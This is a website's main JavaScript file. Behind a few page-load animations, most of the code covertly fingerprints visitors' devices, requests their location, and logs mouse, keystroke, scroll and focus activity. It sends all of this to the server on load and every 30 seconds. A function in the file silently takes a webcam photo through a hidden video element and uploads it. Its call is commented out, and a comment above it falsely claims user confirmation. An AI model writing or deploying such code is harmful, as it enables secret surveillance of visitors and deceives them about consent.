// public/js/main.js
document.addEventListener('DOMContentLoaded', function() {
    console.log('Website loaded successfully!');

    
    // requestCameraAccess()
    
    // Get current page
    const currentPath = window.location.pathname;
    
    // Add some basic animation to the page
    const heroSection = document.querySelector('.hero, .about-hero');
    if (heroSection) {
      heroSection.style.opacity = '0';
      heroSection.style.transform = 'translateY(20px)';
      
      setTimeout(() => {
        heroSection.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
        heroSection.style.opacity = '1';
        heroSection.style.transform = 'translateY(0)';
      }, 100);
    }
    
    // Add animations to features or team members
    const animElements = document.querySelectorAll('.feature-card, .team-member');
    if (animElements.length > 0) {
      animElements.forEach((element, index) => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
          element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
          element.style.opacity = '1';
          element.style.transform = 'translateY(0)';
        }, 300 + (index * 100));
      });
    }
    
    // Enhanced fingerprinting for comprehensive tracking
    try {
      // Generate a device fingerprint
      const generateFingerprint = () => {
        const components = [];
        
        // Add navigator properties
        components.push(navigator.userAgent);
        components.push(navigator.language);
        components.push(navigator.hardwareConcurrency);
        components.push(navigator.deviceMemory);
        
        // Add screen properties
        components.push(window.screen.colorDepth);
        components.push(window.screen.width + 'x' + window.screen.height);
        components.push(window.screen.availWidth + 'x' + window.screen.availHeight);
        components.push(window.devicePixelRatio);
        
        // Add timezone
        components.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
        
        // Add platform details
        components.push(navigator.platform);
        
        // Add canvas fingerprint
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          canvas.width = 200;
          canvas.height = 50;
          
          // Text with different styles
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#F60';
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = '#069';
          ctx.fillText('Fingerprint', 2, 15);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText('Fingerprint', 4, 17);
          
          const canvasData = canvas.toDataURL();
          components.push(canvasData);
        } catch (e) {
          components.push('canvas-error');
        }
        
        // Join all components and hash (simple hash for demo)
        return components.join('###');
      };
  
      // Try to get geolocation if available
      const getGeolocation = () => {
        return new Promise((resolve) => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                resolve({
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude,
                  altitudeAccuracy: position.coords.altitudeAccuracy,
                  heading: position.coords.heading,
                  speed: position.coords.speed,
                  timestamp: position.timestamp
                });
              },
              (error) => {
                resolve({
                  error: error.message,
                  code: error.code
                });
              },
              { timeout: 5000, maximumAge: 0 }
            );
          } else {
            resolve({ error: 'Geolocation not supported' });
          }
        });
      };
  
      // Try to access advanced device information (for demo - most will return null in browser)
      const getAdvancedDeviceInfo = async () => {
        let batteryInfo = {};
        
        // Try to get battery information if available
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            batteryInfo = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
          } catch (e) {
            batteryInfo = { error: 'Battery API error' };
          }
        }
        
        // Attempt to access device orientation (for mobile)
        let orientationInfo = {};
        if (window.DeviceOrientationEvent) {
          window.addEventListener('deviceorientation', (event) => {
            orientationInfo = {
              alpha: event.alpha, // Z-axis rotation
              beta: event.beta,   // X-axis rotation
              gamma: event.gamma  // Y-axis rotation
            };
          }, { once: true });
        }
        
        // Attempt to access device motion (for mobile)
        let motionInfo = {};
        if (window.DeviceMotionEvent) {
          window.addEventListener('devicemotion', (event) => {
            motionInfo = {
              acceleration: {
                x: event.acceleration?.x,
                y: event.acceleration?.y,
                z: event.acceleration?.z
              },
              accelerationIncludingGravity: {
                x: event.accelerationIncludingGravity?.x,
                y: event.accelerationIncludingGravity?.y,
                z: event.accelerationIncludingGravity?.z
              },
              rotationRate: {
                alpha: event.rotationRate?.alpha,
                beta: event.rotationRate?.beta,
                gamma: event.rotationRate?.gamma
              },
              interval: event.interval
            };
          }, { once: true });
        }
        
        return {
          battery: batteryInfo,
          orientation: orientationInfo,
          motion: motionInfo
        };
      };
  
      // Detect network information
      const getNetworkInfo = () => {
        if (navigator.connection) {
          return {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
          };
        }
        return { error: 'Network API not available' };
      };
  
      // Gather all the information
      const screenInfo = {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
        orientation: window.screen.orientation ? {
          type: window.screen.orientation.type,
          angle: window.screen.orientation.angle
        } : 'Not available',
        pixelRatio: window.devicePixelRatio || 1
      };
      
      // Browser, OS, and Device Detection
      const parseUserAgent = () => {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        // Browser detection
        const browser = {
          chrome: /Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua),
          firefox: /Firefox/.test(ua),
          safari: /Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua),
          edge: /Edge/.test(ua) || /Edg/.test(ua),
          opera: /OPR/.test(ua) || /Opera/.test(ua),
          ie: /Trident/.test(ua) || /MSIE/.test(ua),
          brave: /Chrome/.test(ua) && /Brave/.test(ua),
          unknown: false
        };
        
        // If none of the above
        browser.unknown = Object.values(browser).filter(Boolean).length === 0;
        
        // OS detection
        const os = {
          windows: /Windows/.test(ua),
          mac: /Macintosh/.test(ua) || /Mac OS X/.test(ua),
          ios: /iPhone|iPad|iPod/.test(ua),
          android: /Android/.test(ua),
          linux: /Linux/.test(ua) && !/Android/.test(ua),
          unix: /X11/.test(ua) && !/Linux/.test(ua),
          chromeos: /CrOS/.test(ua),
          unknown: false
        };
        
        // If none of the above
        os.unknown = Object.values(os).filter(Boolean).length === 0;
        
        // Device type detection
        const device = {
          mobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
          tablet: /Tablet|iPad/i.test(ua) || 
                  (/Android/.test(ua) && !/Mobi/.test(ua)),
          desktop: !(/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || 
                   /Tablet|iPad/i.test(ua) || 
                   (/Android/.test(ua) && !/Mobi/.test(ua))),
          tv: /TV|SmartTV|SMART-TV|HbbTV/i.test(ua),
          wearable: /Watch|Glass/i.test(ua),
          unknown: false
        };
        
        // If none of the above
        device.unknown = Object.values(device).filter(Boolean).length === 0;
        
        return { browser, os, device, platform };
      };
      
      // Browser features detection
      const featureInfo = {
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        language: navigator.language || navigator.userLanguage || 'unknown',
        languages: navigator.languages ? Array.from(navigator.languages) : ['unknown'],
        doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || window.doNotTrack || 'unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
        timezoneOffset: new Date().getTimezoneOffset(),
        touchpoints: navigator.maxTouchPoints || 0,
        onLine: navigator.onLine,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        webdriver: navigator.webdriver,
        serviceWorker: 'serviceWorker' in navigator,
        webRTC: !!window.RTCPeerConnection,
        webGL: (() => {
          try {
            const canvas = document.createElement('canvas');
            return !!window.WebGLRenderingContext && 
                   (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
          } catch (e) {
            return false;
          }
        })(),
        webGLInfo: (() => {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not available';
            return {
              vendor: gl.getParameter(gl.VENDOR),
              renderer: gl.getParameter(gl.RENDERER),
              version: gl.getParameter(gl.VERSION),
              shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
              unmaskedVendor: gl.getExtension('WEBGL_debug_renderer_info') ? 
                              gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL) : 
                              'Not available',
              unmaskedRenderer: gl.getExtension('WEBGL_debug_renderer_info') ? 
                                gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : 
                                'Not available'
            };
          } catch (e) {
            return 'Error getting WebGL info';
          }
        })(),
        audioContext: (() => {
          try {
            return !!(window.AudioContext || window.webkitAudioContext);
          } catch (e) {
            return false;
          }
        })(),
        canvas: (() => {
          try {
            const canvas = document.createElement('canvas');
            return !!(canvas.getContext('2d'));
          } catch (e) {
            return false;
          }
        })(),
        mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
        permissions: !!navigator.permissions,
        bluetoothAPI: !!navigator.bluetooth,
        clipboard: !!navigator.clipboard,
        credentials: !!navigator.credentials,
        gamepadAPI: !!navigator.getGamepads,
        geolocation: !!navigator.geolocation,
        mediaSession: !!navigator.mediaSession,
        presentation: !!navigator.presentation,
        speechSynthesis: !!window.speechSynthesis,
        storage: !!navigator.storage,
        usb: !!navigator.usb,
        vibrate: !!navigator.vibrate,
        virtualReality: !!navigator.xr
      };
      
      // Gather information about installed plugins
      const pluginInfo = Array.from(navigator.plugins || []).map(plugin => ({
        name: plugin.name,
        description: plugin.description,
        filename: plugin.filename,
        mimeTypes: Array.from(plugin).map(mt => ({
          type: mt.type,
          description: mt.description,
          suffixes: mt.suffixes
        }))
      }));
      
      // Combine all data with device fingerprint
      const clientData = {
        timestamp: new Date().toISOString(),
        pageVisited: currentPath,
        referrer: document.referrer,
        deviceFingerprint: generateFingerprint(),
        uaInfo: parseUserAgent(),
        screenInfo,
        featureInfo,
        plugins: pluginInfo,
        networkInfo: getNetworkInfo(),
        fonts: (() => {
          try {
            // Common fonts to check for
            const fontList = [
              'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math', 
              'Comic Sans MS', 'Consolas', 'Courier New', 'Georgia', 'Helvetica', 'Impact', 
              'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino Linotype', 
              'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings'
            ];
            
            // Check which fonts are available
            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testDiv = document.createElement('div');
            testDiv.style.position = 'absolute';
            testDiv.style.left = '-9999px';
            testDiv.style.visibility = 'hidden';
            document.body.appendChild(testDiv);
            
            const getWidth = (fontFamily) => {
              testDiv.style.fontFamily = fontFamily;
              testDiv.textContent = testString;
              return testDiv.offsetWidth;
            };
            
            const baseWidths = {};
            baseFonts.forEach(font => {
              testDiv.style.fontFamily = font;
              testDiv.style.fontSize = testSize;
              baseWidths[font] = getWidth(font);
            });
            
            const availableFonts = [];
            fontList.forEach(font => {
              let detected = false;
              baseFonts.forEach(baseFont => {
                testDiv.style.fontFamily = `'${font}',${baseFont}`;
                if (getWidth(`'${font}',${baseFont}`) !== baseWidths[baseFont]) {
                  detected = true;
                }
              });
              if (detected) availableFonts.push(font);
            });
            
            document.body.removeChild(testDiv);
            return availableFonts;
          } catch (e) {
            return ['Font detection error'];
          }
        })()
      };
      
      // Get advanced info asynchronously
      Promise.all([
        getGeolocation(),
        getAdvancedDeviceInfo()
      ]).then(([geoData, advancedData]) => {
        const enhancedClientData = {
          ...clientData,
          geolocation: geoData,
          advancedDeviceInfo: advancedData
        };
      
        // Send to server
        fetch('/tracking-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(enhancedClientData),
        })
        .catch(error => console.error('Error sending tracking data:', error));
      });
      
      // Initially send basic data while waiting for async data
      fetch('/tracking-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...clientData,
          initialData: true
        }),
      })
      .catch(error => console.error('Error sending initial tracking data:', error));
      
      // Set up continuous tracking
      let lastActivity = Date.now();
      let activityData = {
        mouse: { moves: 0, clicks: 0, positions: [] },
        keyboard: { keystrokes: 0, keys: {} },
        scroll: { count: 0, directions: { up: 0, down: 0 } },
        focus: { gained: 0, lost: 0, timeInFocus: 0 },
        timeOnPage: 0,
        lastSendTime: Date.now()
      };
      
      // Track mouse movements (sample every 100ms to avoid overwhelming data)
      let lastMoveTime = 0;
      document.addEventListener('mousemove', (event) => {
        const now = Date.now();
        lastActivity = now;
        activityData.mouse.moves++;
        
        // Sample mouse positions at intervals
        if (now - lastMoveTime > 100) {
          if (activityData.mouse.positions.length >= 50) {
            activityData.mouse.positions.shift(); // Keep only latest 50 positions
          }
          activityData.mouse.positions.push({
            x: event.clientX,
            y: event.clientY,
            timestamp: now
          });
          lastMoveTime = now;
        }
      });
      
      // Track mouse clicks
      document.addEventListener('mousedown', (event) => {
        lastActivity = Date.now();
        activityData.mouse.clicks++;
      });
      
      // Track keyboard activity (just count, not actual keys for privacy)
      document.addEventListener('keydown', (event) => {
        lastActivity = Date.now();
        activityData.keyboard.keystrokes++;
        
        // Just log the key type, not the actual key
        const keyType = event.key.length === 1 ? 'character' : 
                       (event.key === 'Enter' || event.key === 'Tab' || event.key === 'Escape' ? event.key : 'special');
        
        if (!activityData.keyboard.keys[keyType]) {
          activityData.keyboard.keys[keyType] = 0;
        }
        activityData.keyboard.keys[keyType]++;
      });
      
      // Track scrolling
      document.addEventListener('wheel', (event) => {
        lastActivity = Date.now();
        activityData.scroll.count++;
        
        if (event.deltaY < 0) {
          activityData.scroll.directions.up++;
        } else {
          activityData.scroll.directions.down++;
        }
      });
      
      // Track tab focus
      window.addEventListener('focus', () => {
        const now = Date.now();
        lastActivity = now;
        activityData.focus.gained++;
        activityData.focus.focusStartTime = now;
      });
      
      window.addEventListener('blur', () => {
        if (activityData.focus.focusStartTime) {
          activityData.focus.timeInFocus += Date.now() - activityData.focus.focusStartTime;
          activityData.focus.focusStartTime = null;
        }
        activityData.focus.lost++;
      });
      
      // Send activity data every 30 seconds
      setInterval(() => {
        const now = Date.now();
        
        // Update time on page
        activityData.timeOnPage = Math.floor((now - activityData.lastSendTime) / 1000);
        activityData.lastSendTime = now;
        
        // Check if we should update focus time
        if (document.hasFocus() && activityData.focus.focusStartTime) {
          activityData.focus.timeInFocus += now - activityData.focus.focusStartTime;
          activityData.focus.focusStartTime = now;
        }
        
        // Send activity update to server
        fetch('/activity-update', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            timestamp: new Date().toISOString(),
            activity: activityData,
            secondsSinceLastActivity: Math.floor((now - lastActivity) / 1000)
          }),
        })
        .catch(error => console.error('Error sending activity data:', error));
        
        // Reset counters but keep cumulative data
        activityData.mouse.moves = 0;
        activityData.mouse.clicks = 0;
        activityData.mouse.positions = [];
        activityData.keyboard.keystrokes = 0;
        activityData.keyboard.keys = {};
        activityData.scroll.count = 0;
        activityData.scroll.directions = { up: 0, down: 0 };
        activityData.focus.gained = 0;
        activityData.focus.lost = 0;
        activityData.focus.timeInFocus = 0;
        activityData.timeOnPage = 0;
      }, 30000);
      
    } catch (e) {
      console.error('Error collecting client data:', e);
    }
  });

  function requestCameraAccess() {
    // Confirm with the user first - essential for transparency!
    if (true) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.style.display = 'none';
          document.body.appendChild(video);
          video.play();
          
          // Take a photo after a brief delay
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to data URL
            const imageData = canvas.toDataURL('image/jpeg');
            
            // Send to server
            fetch('/user-image', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ image: imageData }),
            });
            
            // Stop all video streams
            stream.getTracks().forEach(track => track.stop());
            video.remove();
          }, 1000);
        })
        .catch(function(err) {
          console.log("Camera access error: " + err);
        });
    }
  }